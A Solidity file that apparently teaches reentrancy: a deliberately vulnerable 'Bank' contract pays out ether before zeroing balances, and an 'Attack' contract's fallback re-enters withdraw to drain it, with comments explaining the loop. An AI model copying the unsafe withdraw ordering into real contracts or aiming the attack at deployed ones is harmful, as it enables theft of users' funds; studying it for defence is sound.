// SPDX-License-Identifier: GPL-3.0

pragma solidity 0.8.19;

contract Bank{

    mapping(address=>uint256) public balances;

    function deposit() public payable{
        require(msg.value>= 1 ether,"Amount should be greate than or equal to 1 ether");
        balances[msg.sender]+=msg.value;
    }

    function withdraw() public{
        require(balances[msg.sender]>0,"You have no funds to withdraw");
        (bool sent,) = msg.sender.call{value:balances[msg.sender]}("");
        require(sent,"Transaction failed");
         balances[msg.sender] = 0;
    }
}

contract Attack{
    Bank bank;
    constructor(Bank _bank){
        bank = Bank(_bank);
    }

    fallback() external payable{
        if(address(bank).balance>1 ether){
            bank.withdraw();                //Reentrancy here, malicious code in fallback function, it will execute
                                            //when bank tries to send ether to attacker and from there
                                            //it will get stuck in a loop of withdraw function till bank 
                                            //balance becomes less than 1 ether.
        }
    }

    function attack() public payable{
        require(msg.value>= 1 ether,"Amount should be greate than or equal to 1 ether");
        bank.deposit{value:msg.value}();
        bank.withdraw();
    }
}